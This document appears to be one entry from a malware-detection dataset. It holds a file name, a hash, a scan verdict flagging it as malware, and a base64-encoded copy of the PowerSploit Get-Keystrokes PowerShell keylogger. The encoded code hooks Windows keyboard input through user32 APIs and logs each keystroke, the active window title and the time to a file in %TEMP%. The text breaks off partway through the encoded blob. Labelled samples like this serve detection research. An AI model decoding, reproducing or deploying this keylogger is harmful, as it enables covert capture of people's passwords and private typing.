Get-Keystrokes.ps1,d82be5ccb9416958abeb59506d112af7,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gR2V0LUtleXN0cm9rZXMgewo8IwouU1lOT1BTSVMKCiAgICBMb2dzIGtleXMgcHJlc3NlZCwgdGltZSBhbmQgdGhlIGFjdGl2ZSB3aW5kb3cuCiAgICAKICAgIFBvd2VyU3Bsb2l0IEZ1bmN0aW9uOiBHZXQtS2V5c3Ryb2tlcwogICAgT3JpZ2luYWwgQXV0aG9yczogQ2hyaXMgQ2FtcGJlbGwgKEBvYnNjdXJlc2VjKSBhbmQgTWF0dGhldyBHcmFlYmVyIChAbWF0dGlmZXN0YXRpb24pCiAgICBSZXZpc2VkIEJ5OiBKZXNzZSBEYXZpcyAoQHNlY2Fic3RyYWN0aW9uKQogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICBSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IE5vbmUKICAgIE9wdGlvbmFsIERlcGVuZGVuY2llczogTm9uZQogICAgCi5QQVJBTUVURVIgTG9nUGF0aAoKICAgIFNwZWNpZmllcyB0aGUgcGF0aCB3aGVyZSBwcmVzc2VkIGtleSBkZXRhaWxzIHdpbGwgYmUgbG9nZ2VkLiBCeSBkZWZhdWx0LCBrZXlzdHJva2VzIGFyZSBsb2dnZWQgdG8gJVRFTVAlXGtleS5sb2cuCgouUEFSQU1FVEVSIFRpbWVvdXQKCiAgICBTcGVjaWZpZXMgdGhlIGludGVydmFsIGluIG1pbnV0ZXMgdG8gY2FwdHVyZSBrZXlzdHJva2VzLiBCeSBkZWZhdWx0LCBrZXlzdHJva2VzIGFyZSBjYXB0dXJlZCBpbmRlZmluaXRlbHkuCgouUEFSQU1FVEVSIFBhc3NUaHJ1CgogICAgUmV0dXJucyB0aGUga2V5bG9nZ2VyJ3MgUG93ZXJTaGVsbCBvYmplY3QsIHNvIHRoYXQgaXQgbWF5IG1hbmlwdWxhdGVkIChkaXNwb3NlZCkgYnkgdGhlIHVzZXI7IHByaW1hcmlseSBmb3IgdGVzdGluZyBwdXJwb3Nlcy4KCi5FWEFNUExFCgogICAgR2V0LUtleXN0cm9rZXMgLUxvZ1BhdGggQzpca2V5LmxvZwoKLkVYQU1QTEUKCiAgICBHZXQtS2V5c3Ryb2tlcyAtVGltZW91dCAyMAogICAgCi5MSU5LCgogICAgaHR0cDovL3d3dy5vYnNjdXJlc2VjLmNvbS8KICAgIGh0dHA6Ly93d3cuZXhwbG9pdC1tb25kYXkuY29tLwogICAgaHR0cHM6Ly9naXRodWIuY29tL3NlY2Fic3RyYWN0aW9uCiM+CiAgICBbQ21kbGV0QmluZGluZygpXSAKICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCldCiAgICAgICAgW1ZhbGlkYXRlU2NyaXB0KHtUZXN0LVBhdGggKFJlc29sdmUtUGF0aCAoU3BsaXQtUGF0aCAtUGFyZW50IC1QYXRoICRfKSkgLVBhdGhUeXBlIENvbnRhaW5lcn0pXQogICAgICAgIFtTdHJpbmddJExvZ1BhdGggPSAiJCgkZW52OlRFTVApXGtleS5sb2ciLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSldCiAgICAgICAgW0RvdWJsZV0kVGltZW91dCwKCiAgICAgICAgW1BhcmFtZXRlcigpXQogICAgICAgIFtTd2l0Y2hdJFBhc3NUaHJ1CiAgICApCgogICAgJExvZ1BhdGggPSBKb2luLVBhdGggKFJlc29sdmUtUGF0aCAoU3BsaXQtUGF0aCAtUGFyZW50ICRMb2dQYXRoKSkgKFNwbGl0LVBhdGggLUxlYWYgJExvZ1BhdGgpCgogICAgdHJ5IHsgJyJUeXBlZEtleSIsIldpbmRvd1RpdGxlIiwiVGltZSInIHwgT3V0LUZpbGUgLUZpbGVQYXRoICRMb2dQYXRoIC1FbmNvZGluZyB1bmljb2RlIH0KICAgIGNhdGNoIHsgdGhyb3cgJF8gfQoKICAgICRTY3JpcHQgPSB7CiAgICAgICAgUGFyYW0gKAogICAgICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCldCiAgICAgICAgICAgIFtTdHJpbmddJExvZ1BhdGgsCgogICAgICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSldCiAgICAgICAgICAgIFtEb3VibGVdJFRpbWVvdXQKICAgICAgICApCgogICAgICAgIGZ1bmN0aW9uIGxvY2FsOkdldC1EZWxlZ2F0ZVR5cGUgewogICAgICAgICAgICBQYXJhbSAoCiAgICAgICAgICAgICAgICBbT3V0cHV0VHlwZShbVHlwZV0pXQogICAgICAgICAgICAKICAgICAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCldCiAgICAgICAgICAgICAgICBbVHlwZVtdXQogICAgICAgICAgICAgICAgJFBhcmFtZXRlcnMgPSAoTmV3LU9iamVjdCBUeXBlW10oMCkpLAogICAgICAgICAgICAKICAgICAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMSApXQogICAgICAgICAgICAgICAgW1R5cGVdCiAgICAgICAgICAgICAgICAkUmV0dXJuVHlwZSA9IFtWb2lkXQogICAgICAgICAgICApCgogICAgICAgICAgICAkRG9tYWluID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4KICAgICAgICAgICAgJER5bkFzc2VtYmx5ID0gTmV3LU9iamVjdCBSZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKQogICAgICAgICAgICAkQXNzZW1ibHlCdWlsZGVyID0gJERvbWFpbi5EZWZpbmVEeW5hbWljQXNzZW1ibHkoJER5bkFzc2VtYmx5LCBbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4pCiAgICAgICAgICAgICRNb2R1bGVCdWlsZGVyID0gJEFzc2VtYmx5QnVpbGRlci5EZWZpbmVEeW5hbWljTW9kdWxlKCdJbk1lbW9yeU1vZHVsZScsICRmYWxzZSkKICAgICAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnTXlEZWxlZ2F0ZVR5cGUnLCAnQ2xhc3MsIFB1YmxpYywgU2VhbGVkLCBBbnNpQ2xhc3MsIEF1dG9DbGFzcycsIFtTeXN0ZW0uTXVsdGljYXN0RGVsZWdhdGVdKQogICAgICAgICAgICAkQ29uc3RydWN0b3JCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJFBhcmFtZXRlcnMpCiAgICAgICAgICAgICRDb25zdHJ1Y3RvckJ1aWxkZXIuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpCiAgICAgICAgICAgICRNZXRob2RCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJFJldHVyblR5cGUsICRQYXJhbWV0ZXJzKQogICAgICAgICAgICAkTWV0aG9kQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKICAgICAgICAKICAgICAgICAgICAgJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBsb2NhbDpHZXQtUHJvY0FkZHJlc3MgewogICAgICAgICAgICBQYXJhbSAoCiAgICAgICAgICAgICAgICBbT3V0cHV0VHlwZShbSW50UHRyXSldCiAgICAgICAgCiAgICAgICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlICldCiAgICAgICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAgICAgJE1vZHVsZSwKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRUcnVlICldCiAgICAgICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAgICAgJFByb2NlZHVyZQogICAgICAgICAgICApCgogICAgICAgICAgICAjIEdldCBhIHJlZmVyZW5jZSB0byBTeXN0ZW0uZGxsIGluIHRoZSBHQUMKICAgICAgICAgICAgJFN5c3RlbUFzc2VtYmx5ID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpIHwKICAgICAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfQogICAgICAgICAgICAkVW5zYWZlTmF0aXZlTWV0aG9kcyA9ICRTeXN0ZW1Bc3NlbWJseS5HZXRUeXBlKCdNaWNyb3NvZnQuV2luMzIuVW5zYWZlTmF0aXZlTWV0aG9kcycpCiAgICAgICAgICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIHRoZSBHZXRNb2R1bGVIYW5kbGUgYW5kIEdldFByb2NBZGRyZXNzIG1ldGhvZHMKICAgICAgICAgICAgJEdldE1vZHVsZUhhbmRsZSA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0TW9kdWxlSGFuZGxlJykKICAgICAgICAgICAgJEdldFByb2NBZGRyZXNzID0gJFVuc2FmZU5hdGl2ZU1ldGhvZHMuR2V0TWV0aG9kKCdHZXRQcm9jQWRkcmVzcycpCiAgICAgICAgICAgICMgR2V0IGEgaGFuZGxlIHRvIHRoZSBtb2R1bGUgc3BlY2lmaWVkCiAgICAgICAgICAgICRLZXJuMzJIYW5kbGUgPSAkR2V0TW9kdWxlSGFuZGxlLkludm9rZSgkbnVsbCwgQCgkTW9kdWxlKSkKICAgICAgICAgICAgJHRtcFB0ciA9IE5ldy1PYmplY3QgSW50UHRyCiAgICAgICAgICAgICRIYW5kbGVSZWYgPSBOZXctT2JqZWN0IFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWYoJHRtcFB0ciwgJEtlcm4zMkhhbmRsZSkKICAgICAgICAKICAgICAgICAgICAgIyBSZXR1cm4gdGhlIGFkZHJlc3Mgb2YgdGhlIGZ1bmN0aW9uCiAgICAgICAgICAgICRHZXRQcm9jQWRkcmVzcy5JbnZva2UoJG51bGwsIEAoW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZl0kSGFuZGxlUmVmLCAkUHJvY2VkdXJlKSkKICAgICAgICB9CgogICAgICAgICNyZWdpb24gSW1wb3J0cwoKICAgICAgICBbdm9pZF1bUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWRXaXRoUGFydGlhbE5hbWUoJ1N5c3RlbS5XaW5kb3dzLkZvcm1zJykKCiAgICAgICAgIyBTZXRXaW5kb3dzSG9va0V4CiAgICAgICAgJFNldFdpbmRvd3NIb29rRXhBZGRyID0gR2V0LVByb2NBZGRyZXNzIHVzZXIzMi5kbGwgU2V0V2luZG93c0hvb2tFeEEKCSAgICAkU2V0V2luZG93c0hvb2tFeERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnQzMl0sIFtNdWx0aWNhc3REZWxlZ2F0ZV0sIFtJbnRQdHJdLCBbSW50MzJdKSAoW0ludFB0cl0pCgkgICAgJFNldFdpbmRvd3NIb29rRXggPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRTZXRXaW5kb3dzSG9va0V4QWRkciwgJFNldFdpbmRvd3NIb29rRXhEZWxlZ2F0ZSkKCiAgICAgICAgIyBDYWxsTmV4dEhvb2tFeAogICAgICAgICRDYWxsTmV4dEhvb2tFeEFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgdXNlcjMyLmRsbCBDYWxsTmV4dEhvb2tFeAoJICAgICRDYWxsTmV4dEhvb2tFeERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0pIChbSW50UHRyXSkKCSAgICAkQ2FsbE5leHRIb29rRXggPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRDYWxsTmV4dEhvb2tFeEFkZHIsICRDYWxsTmV4dEhvb2tFeERlbGVnYXRlKQoKICAgICAgICAjIFVuaG9va1dpbmRvd3NIb29rRXgKICAgICAgICAkVW5ob29rV2luZG93c0hvb2tFeEFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgdXNlcjMyLmRsbCBVbmhvb2tXaW5kb3dzSG9va0V4CgkgICAgJFVuaG9va1dpbmRvd3NIb29rRXhEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSkgKFtWb2lkXSkKCSAgICAkVW5ob29rV2luZG93c0hvb2tFeCA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFVuaG9va1dpbmRvd3NIb29rRXhBZGRyLCAkVW5ob29rV2luZG93c0hvb2tFeERlbGVnYXRlKQoKICAgICAgICAjIFBlZWtNZXNzYWdlCiAgICAgICAgJFBlZWtNZXNzYWdlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyB1c2VyMzIuZGxsIFBlZWtNZXNzYWdlQQoJICAgICRQZWVrTWVzc2FnZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdLCBbVUludDMyXSkgKFtWb2lkXSkKCSAgICAkUGVla01lc3NhZ2UgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRQZWVrTWVzc2FnZUFkZHIsICRQZWVrTWVzc2FnZURlbGVnYXRlKQoKICAgICAgICAjIEdldEFzeW5jS2V5U3RhdGUKICAgICAgICAkR2V0QXN5bmNLZXlTdGF0ZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgdXNlcjMyLmRsbCBHZXRBc3luY0tleVN0YXRlCgkgICAgJEdldEFzeW5jS2V5U3RhdGVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbV2luZG93cy5Gb3Jtcy5LZXlzXSkgKFtJbnQxNl0pCgkgICAgJEdldEFzeW5jS2V5U3RhdGUgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRHZXRBc3luY0tleVN0YXRlQWRkciwgJEdldEFzeW5jS2V5U3RhdGVEZWxlZ2F0ZSkKCiAgICAgICAgIyBHZXRGb3JlZ3JvdW5kV2luZG93CiAgICAgICAgJEdldEZvcmVncm91bmRXaW5kb3dBZGRyID0gR2V0LVByb2NBZGRyZXNzIHVzZXIzMi5kbGwgR2V0Rm9yZWdyb3VuZFdpbmRvdwoJICAgICRHZXRGb3JlZ3JvdW5kV2luZG93RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoKSAoW0ludFB0cl0pCgkgICAgJEdldEZvcmVncm91bmRXaW5kb3cgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRHZXRGb3JlZ3JvdW5kV2luZG93QWRkciwgJEdldEZvcmVncm91bmRXaW5kb3dEZWxlZ2F0ZSkKCiAgICAgICAgIyBHZXRXaW5kb3dUZXh0CiAgICAgICAgJEdldFdpbmRvd1RleHRBZGRyID0gR2V0LVByb2NBZGRyZXNzIHVzZXIzMi5kbGwgR2V0V2luZG93VGV4dEEKCSAgICAkR2V0V2luZG93VGV4dERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVGV4dC5TdHJpbmdCdWlsZGVyXSwgW0ludDMyXSkgKFtWb2lkXSkKCSAgICAkR2V0V2luZG93VGV4dCA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEdldFdpbmRvd1RleHRBZGRyLCAkR2V0V2luZG93VGV4dERlbGVnYXRlKQoKICAgICAgICAjIEdldE1vZHVsZUhhbmRsZQogICAgICAgICRHZXRNb2R1bGVIYW5kbGVBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBHZXRNb2R1bGVIYW5kbGVBCgkgICAgJEdldE1vZHVsZUhhbmRsZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtTdHJpbmddKSAoW0ludFB0cl0pCgkgICAgJEdldE1vZHVsZUhhbmRsZSA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEdldE1vZHVsZUhhbmRsZUFkZHIsICRHZXRNb2R1bGVIYW5kbGVEZWxlZ2F0ZSkKICAgIAogICAgICAgICNlbmRyZWdpb24gSW1wb3J0cwoKICAgICAgICAkQ2FsbGJhY2tTY3JpcHQgPSB7CiAgICAgICAgICAgIFBhcmFtICgKICAgICAgICAgICAgICAgIFtQYXJhbWV0ZXIoKV0KICAgICAgICAgICAgICAgIFtJbnQzMl0kQ29kZSwKCiAgICAgICAgICAgICAgICBbUGFyYW1ldGVyKCldCiAgICAgICAgICAgICAgICBbSW50UHRyXSR3UGFyYW0sCgogICAgICAgICAgICAgICAgW1BhcmFtZXRlcigpXQogICAgICAgICAgICAgICAgW0ludFB0cl0kbFBhcmFtCiAgICAgICAgICAgICkKCiAgICAgICAgICAgICRLZXlzID0gW1dpbmRvd3MuRm9ybXMuS2V5c10KICAgICAgICAKICAgICAgICAgICAgJE1zZ1R5cGUgPSAkd1BhcmFtLlRvSW50MzIoKQoKICAgICAgICAgICAgIyBQcm9jZXNzIFdNX0tFWURPV04gJiBXTV9TWVNLRVlET1dOIG1lc3NhZ2VzCiAgICAgICAgICAgIGlmICgkQ29kZSAtZ2UgMCAtYW5kICgkTXNnVHlwZSAtZXEgMHgxMDAgLW9yICRNc2dUeXBlIC1lcSAweDEwNCkpIHsKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkaFdpbmRvdyA9ICRHZXRGb3JlZ3JvdW5kV2luZG93Lkludm9rZSgpCgogICAgICAgICAgICAgICAgJFNoaWZ0U3RhdGUgPSAkR2V0QXN5bmNLZXlTdGF0ZS5JbnZva2UoJEtleXM6OlNoaWZ0S2V5KQogICAgICAgICAgICAgICAgaWYgKCgkU2hpZnRTdGF0ZSAtYmFuZCAweDgwMDApIC1lcSAweDgwMDApIHsgJFNoaWZ0ID0gJHRydWUgfQogICAgICAgICAgICAgICAgZWxzZSB7ICRTaGlmdCA9ICRmYWxzZSB9CgogICAgICAgICAgICAgICAgJENhcHMgPSBbQ29uc29sZV06OkNhcHNMb2NrCgogICAgICAgICAgICAgICAgIyBSZWFkIHZpcnR1YWwta2V5IGZyb20gYnVmZmVyCiAgICAgICAgICAgICAgICAkdktleSA9IFtXaW5kb3dzLkZvcm1zLktleXNdW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpSZWFkSW50MzIoJGxQYXJhbSkKCiAgICAgICAgICAgICAgICAjIFBhcnNlIHZpcnR1YWwta2V5CiAgICAgICAgICAgICAgICBpZiAoJHZLZXkgLWd0IDY0IC1hbmQgJHZLZXkgLWx0IDkxKSB7ICMgQWxwaGFiZXQgY2hhcmFjdGVycwogICAgICAgICAgICAgICAgICAgIGlmICgkU2hpZnQgLXhvciAkQ2FwcykgeyAkS2V5ID0gJHZLZXkuVG9TdHJpbmcoKSB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7ICRLZXkgPSAkdktleS5Ub1N0cmluZygpLlRvTG93ZXIoKSB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCR2S2V5IC1nZSA5NiAtYW5kICR2S2V5IC1sZSAxMTEpIHsgIyBOdW1iZXIgcGFkIGNoYXJhY3RlcnMKICAgICAgICAgICAgICAgICAgICBzd2l0Y2ggKCR2S2V5LnZhbHVlX18pIHsKICAgICAgICAgICAgICAgICAgICAgICAgOTYgeyAkS2V5ID0gJzAnIH0KICAgICAgICAgICAgICAgICAgICAgICAgOTcgeyAkS2V5ID0gJzEnIH0KICAgICAgICAgICAgICAgICAgICAgICAgOTggeyAkS2V5ID0gJzInIH0KICAgICAgICAgICAgICAgICAgICAgICAgOTkgeyAkS2V5ID0gJzMnIH0KICAgICAgICAgICAgICAgICAgICAgICAgMTAwIHsgJEtleSA9ICc0JyB9CiAgICAgICAgICAgICAgICAgICAgICAgIDEwMSB7ICRLZXkgPSAnNScgfQogICAgICAgICAgICAgICAgICAgICAgICAxMDIgeyAkS2V5ID0gJzYnIH0KICAgICAgICAgICAgICAgICAgICAgICAgMTAzIHsgJEtleSA9ICc3JyB9CiAgICAgICAgICAgICAgICAgICAgICAgIDEwNCB7ICRLZXkgPSAnOCcgfQogICAgICAgICAgICAgICAgICAgICAgICAxMDUgeyAkS2V5ID0gJzknIH0KICAgICAgICAgICAgICAgICAgICAgICAgMTA2IHsgJEtleSA9ICIqIiB9CiAgICAgICAgICAgICAgICAgICAgICAgIDEwNyB7ICRLZXkgPSAiKyIgfQogICAgICAgICAgICAgICAgICAgICAgICAxMDggeyAkS2V5ID0gInwiIH0KICAgICAgICAgICAgICAgICAgICAgICAgMTA5IHsgJEtleSA9ICItIiB9CiAgICAgICAgICAgICAgICAgICAgICAgIDExMCB7ICRLZXkgPSAiLiIgfQogICAgICAgICAgICAgICAgICAgICAgICAxMTEgeyAkS2V5ID0gIi8iIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCgkdktleSAtZ2UgNDggLWFuZCAkdktleSAtbGUgNTcpIC1vciAoJHZLZXkgLWdlIDE4NiAtYW5kICR2S2V5IC1sZSAxOTIpIC1vciAoJHZLZXkgLWdlIDIxOSAtYW5kICR2S2V5IC1sZSAyMjIpKSB7ICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmICgkU2hpZnQpIHsgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgc3dpdGNoICgkdktleS52YWx1ZV9fKSB7ICMgU2hpZnRhYmxlIGNoYXJhY3RlcnMKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDQ4IHsgJEtleSA9ICcpJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA0OSB7ICRLZXkgPSAnIScgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTAgeyAkS2V5ID0gJ0AnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDUxIHsgJEtleSA9ICcjJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1MiB7ICRLZXkgPSAnJCcgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTMgeyAkS2V5ID0gJyUnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDU0IHsgJEtleSA9ICdeJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1NSB7ICRLZXkgPSAnJicgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTYgeyAkS2V5ID0gJyonIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDU3IHsgJEtleSA9ICcoJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxODYgeyAkS2V5ID0gJzonIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE4NyB7ICRLZXkgPSAnKycgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMTg4IHsgJEtleSA9ICc8JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxODkgeyAkS2V5ID0gJ18nIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE5MCB7ICRLZXkgPSAnPicgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMTkxIHsgJEtleSA9ICc/JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxOTIgeyAkS2V5ID0gJ34nIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDIxOSB7ICRLZXkgPSAneycgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMjIwIHsgJEtleSA9ICd8JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAyMjEgeyAkS2V5ID0gJ30nIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDIyMiB7ICRLZXkgPSAnPERvdWJsZSBRdW90ZXM+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHN3aXRjaCAoJHZLZXkudmFsdWVfXykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgNDggeyAkS2V5ID0gJzAnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDQ5IHsgJEtleSA9ICcxJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1MCB7ICRLZXkgPSAnMicgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTEgeyAkS2V5ID0gJzMnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDUyIHsgJEtleSA9ICc0JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1MyB7ICRLZXkgPSAnNScgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTQgeyAkS2V5ID0gJzYnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDU1IHsgJEtleSA9ICc3JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1NiB7ICRLZXkgPSAnOCcgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTcgeyAkS2V5ID0gJzknIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE4NiB7ICRLZXkgPSAnOycgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMTg3IHsgJEtleSA9ICc9JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxODggeyAkS2V5ID0gJywnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE4OSB7ICRLZXkgPSAnLScgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMTkwIHsgJEtleSA9ICcuJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxOTEgeyAkS2V5ID0gJy8nIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE5MiB7ICRLZXkgPSAnYCcgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMjE5IHsgJEtleSA9ICdbJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAyMjAgeyAkS2V5ID0gJ1wnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDIyMSB7ICRLZXkgPSAnXScgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMjIyIHsgJEtleSA9ICc8U2luZ2xlIFF1b3RlPicgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgc3dpdGNoICgkdktleSkgewogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RjEgIHsgJEtleSA9ICc8RjE+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpGMiAgeyAkS2V5ID0gJzxGMj4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkYzICB7ICRLZXkgPSAnPEYzPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RjQgIHsgJEtleSA9ICc8RjQ+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpGNSAgeyAkS2V5ID0gJzxGNT4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkY2ICB7ICRLZXkgPSAnPEY2PicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RjcgIHsgJEtleSA9ICc8Rjc+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpGOCAgeyAkS2V5ID0gJzxGOD4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkY5ICB7ICRLZXkgPSAnPEY5PicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RjEwIHsgJEtleSA9ICc8RjEwPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RjExIHsgJEtleSA9ICc8RjExPicgfQogICAgICAgICAgIC